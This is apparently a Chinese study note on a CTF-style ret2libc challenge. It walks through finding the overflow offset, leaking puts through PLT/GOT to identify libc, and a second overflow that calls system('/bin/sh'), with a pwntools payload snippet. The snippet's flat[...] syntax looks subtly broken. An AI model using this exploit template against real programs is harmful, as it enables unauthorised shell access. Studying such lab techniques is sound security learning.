# 学习笔记 · ret2libc 入门

> 来源：靶场复现 | 难度：⭐⭐ | 考点：`栈溢出` `ret2libc` `PLT/GOT`

## 题目特征

32/64 位 ELF，NX 开启（不能上 shellcode），无 canary，程序里有 `puts` 可用于泄漏。

## 思路链

### 1. 确认偏移

```bash
cyclic 200 | ./chall          # 跑崩
cyclic -l <崩溃地址>          # → offset（例如 112）
```

### 2. 泄漏 libc 版本

栈布置：`padding + puts@plt + main地址 + puts@got`
→ 程序打印 puts 真实地址 → 低 12 位对表（libc-database）确认 libc 版本 → 算出 `system` 与 `/bin/sh` 偏移。

### 3. 第二次溢出拿 shell

栈布置：`padding + ret(对齐) + system_addr + ret_addr + binsh_addr`

## Exploit

完整模板见 [scripts/pwn/ret2libc_template.py](../../scripts/pwn/ret2libc_template.py)，核心片段：

```python
payload1 = flat[b'a'*112, puts_plt, main_addr, puts_got]
p.sendlineafter(b'?', payload1)
leak = u32(p.recv(4))
libc.address = leak - libc.symbols['puts']
payload2 = flat[b'a'*112, ret, libc.symbols['system'], 0xdeadc0de, next(libc.search(b'/bin/sh\x00'))]
```

## 易踩的坑

- 64 位参数走寄存器（RDI），需要 `pop rdi; ret` gadget
- Ubuntu 18.04+ 的 `movaps` 栈对齐问题 → system 前加一个 `ret`
- recv 泄漏地址时注意去掉末尾换行

## 总结

ret2libc 三步曲：**泄漏 → 算基址 → 二次返回**。把这套模板背熟，大部分入门栈题都能套。
